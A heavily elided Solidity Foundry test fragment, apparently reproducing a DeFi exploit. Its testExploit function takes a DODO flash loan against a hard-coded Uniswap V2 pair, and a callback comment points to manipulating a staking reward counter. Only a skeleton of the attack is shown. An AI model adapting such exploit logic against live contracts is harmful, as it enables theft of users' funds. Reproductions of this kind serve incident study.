...
contract ContractTest is Test {
    ...
    IUniswapV2Pair Pair =
        IUniswapV2Pair(0x333896437125fF680f146f18c8A164Be831C4C71);
    ...
    function testExploit() public {
        ...
        IDVM(dodo).flashLoan(0, 500 * 1e18, address(this), new bytes(1));
    ...
    function DPPFlashLoanCall(
        ...
        ); // change totalStakeReward > lastTotalStakeReward
